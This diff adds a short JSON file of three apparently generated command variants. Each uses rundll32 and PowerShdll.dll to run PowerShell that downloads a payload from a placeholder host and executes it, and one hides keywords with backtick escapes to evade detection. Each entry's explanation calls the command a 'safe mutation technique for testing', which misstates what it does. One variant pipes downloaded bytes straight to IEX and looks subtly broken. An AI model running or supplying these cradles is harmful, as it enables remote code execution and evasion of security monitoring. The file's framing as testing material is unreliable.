@@ -1,0 +1,14 @@
+[
+  {
+    "output": "rundll32.exe PowerShdll.dll,main -c \"I`e`x (New-Object Net.WebClient).D`o`wnloadString('http://example.com/payload')\"",
+    "explanation": "This command uses escape characters (`) to obfuscate the command line while maintaining the same behavior as the original. It is a safe mutation technique for testing purposes."
+  },
+  {
+    "output": "rundll32.exe PowerShdll.dll,main -c \"IEX(New-Object Net.WebClient).DownloadData('http://example.com/payload')\"",
+    "explanation": "This command uses substitution of spaces and shortens the command by omitting unnecessary spaces, which is an accepted mutation technique for testing."
+  },
+  {
+    "output": "rundll32.exe PowerShdll.dll,main -c \"Invoke-RestMethod -Uri http://example.com/payload | IEX\"",
+    "explanation": "This command uses reordering and substitution of equivalent syntax to maintain the same behavior while altering the structure for testing purposes."
+  }
+]
